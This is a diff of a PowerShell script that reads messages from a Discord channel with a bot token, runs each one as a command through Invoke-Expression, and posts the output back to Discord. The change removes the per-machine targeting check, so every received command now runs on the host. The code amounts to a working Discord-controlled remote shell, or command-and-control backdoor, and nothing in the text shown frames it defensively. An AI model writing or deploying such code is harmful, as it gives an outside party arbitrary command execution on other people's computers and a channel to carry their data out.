@@ -11,9 +11,6 @@ $client = New-Object System.Net.Http.HttpClient
 $client.DefaultRequestHeaders.Authorization = "Bot $token"
 $client.DefaultRequestHeaders.Accept.Add("application/json")
 
-# Get the current machine identity using `whoami`
-$global:machineName = whoami
-
 # Variable to store the latest message ID processed
 $global:lastMessageId = $null
 
@@ -46,36 +43,27 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to execute commands if addressed to this machine
+# Function to execute any command sent via Discord
 function Execute-Command {
     param (
         [string]$command
     )
 
-    # Check if the command includes this machine's name (from `whoami`)
-    if ($command -like "*$global:machineName*") {
-        # Remove the machine name from the command
-        $strippedCommand = $command.Replace("$global:machineName:", "").Trim()
+    try {
+        # Run the command
+        $output = Invoke-Expression $command
 
-        try {
-            # Run the command
-            $output = Invoke-Expression $strippedCommand
-
-            if ($output) {
-                $result = $output -join "`n"  # Join multiline output for Discord message
-            } else {
-                $result = "Command executed successfully with no output."
-            }
-        } catch {
-            $result = "Error executing command: $_"
+        if ($output) {
+            $result = $output -join "`n"  # Join multiline output for Discord message
+        } else {
+            $result = "Command executed successfully with no output."
         }
-
-        # Send the output to Discord
-        Send-DiscordMessage -Message $result
-    } else {
-        # Command not for this machine, do nothing
-        Write-Host "Command not addressed to this machine."
+    } catch {
+        $result = "Error executing command: $_"
     }
+
+    # Send the output to Discord
+    Send-DiscordMessage -Message $result
 }
 
 # Function to get messages from Discord
